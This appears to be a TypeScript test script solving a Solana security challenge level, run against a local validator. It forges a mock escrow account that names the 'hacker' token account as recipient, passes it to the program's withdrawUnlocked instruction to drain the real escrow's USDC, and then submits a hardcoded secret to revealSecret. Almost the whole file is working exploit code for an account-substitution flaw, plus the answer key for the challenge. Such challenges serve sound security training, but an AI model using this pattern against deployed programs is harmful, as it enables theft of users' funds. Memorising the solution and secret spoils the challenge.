import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import * as spl from "@solana/spl-token"
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")
const ESCROW_RECIPIENT = new web3.PublicKey("H6hsz95AWEzCeHzvnXhs84gDxuiKdmZ6qgKtWqVFZfQJ")


// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v


const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"


// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;

  let escrowPdaAuthority: any;
  let attackEscrow : any;


  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);
  });

  it("Inspect escrow", async () => {  
    const escrow = await program.account.escrow.fetch(ESCROW);
    console.log(escrow);
  });

  it('Creates a mock Escrow account', async () => {

    const mockEscrowKeypair = anchor.web3.Keypair.generate();
    console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`)
    const startTime = new anchor.BN(Math.floor(Date.now() / 1000)); // Current timestamp
    const interval = new anchor.BN(1); // Smallest possible interval (1 second)
    const endTime = startTime.add(new anchor.BN(10));
  
    const mockEscrow = {
      recipient: HACKER_TOKEN_ACCOUNT,
      mint: USDC,
      amount: new anchor.BN('2001000'),
      withdrawal: new anchor.BN('0'), 
      startTime: startTime,
      endTime: endTime,
      interval: interval,
    };  
    // Calculate the space required for the account
    const ESCROW_SIZE = 8 + 32 + 100;
  
    // Create the account
    const createAccountInstruction = anchor.web3.SystemProgram.createAccount({
      fromPubkey: provider.wallet.publicKey,
      newAccountPubkey: mockEscrowKeypair.publicKey,
      space: ESCROW_SIZE,
      lamports: 1000000000,
      programId: web3.SystemProgram.programId,
    });
    console.log(createAccountInstruction)

    // send transaction
    const transaction = new anchor.web3.Transaction()
    .add(createAccountInstruction)
    
    const signature = await provider.sendAndConfirm(transaction, [mockEscrowKeypair]);
    console.log('Mock Escrow account created successfully. Signature:', signature);
    await new Promise(resolve => setTimeout(resolve, 2000));

    attackEscrow = mockEscrowKeypair.publicKey;
  });

  it('derives ATA for hacker', async () => {

    const attackEscrowAta = await spl.getOrCreateAssociatedTokenAccount(
      provider.connection,
      hacker,
      USDC,
      hacker.publicKey,
      false,
      'confirmed',
      null,
      spl.TOKEN_2022_PROGRAM_ID,
      spl.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    await new Promise(resolve => setTimeout(resolve, 2000));
    const hackerAtaPubKey = new web3.PublicKey(attackEscrowAta.address)
    console.log(`Hacker ATA -> ${hackerAtaPubKey}`)
  });


  it ("Withdraw", async () => {
    const withdraw = await program.methods.withdrawUnlocked()
    .accounts({
      recipient: hacker.publicKey,
      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
      escrow: attackEscrow,
      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
      escrowPdaAuthority: escrowPdaAuthority,
      mint: USDC,
      tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId
    })
    .signers([hacker])
    .rpc()
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(withdraw);

  })
  


  it("Reveals secrets", async () => {

    const airdropSignature = await provider.connection.requestAirdrop(
      hacker.publicKey,
      1000000000 // 1 SOL
    );
    await provider.connection.confirmTransaction(airdropSignature);
    // Create the transaction
    const tx = await program.methods.revealSecret(SECRET)
      .accounts({
        hacker: hacker.publicKey,
        hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
        mint: USDC
      })
      .transaction();
  
    // Sign the transaction
    tx.feePayer = hacker.publicKey;
    tx.recentBlockhash = (await provider.connection.getLatestBlockhash()).blockhash;
    tx.sign(hacker);
  
    // Send the transaction
    const txid = await provider.connection.sendRawTransaction(tx.serialize()); 
    await new Promise(resolve => setTimeout(resolve, 2000)); 
    console.log("Transaction confirmed. Signature:", txid);
  
    // Optional: Fetch the transaction details
    const txDetails = await provider.connection.getTransaction(txid, {
      commitment: 'confirmed',
      maxSupportedTransactionVersion: 0
    });
  
    await new Promise(resolve => setTimeout(resolve, 5000));
    console.log("Transaction details:", txDetails);
  
  });
})


async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
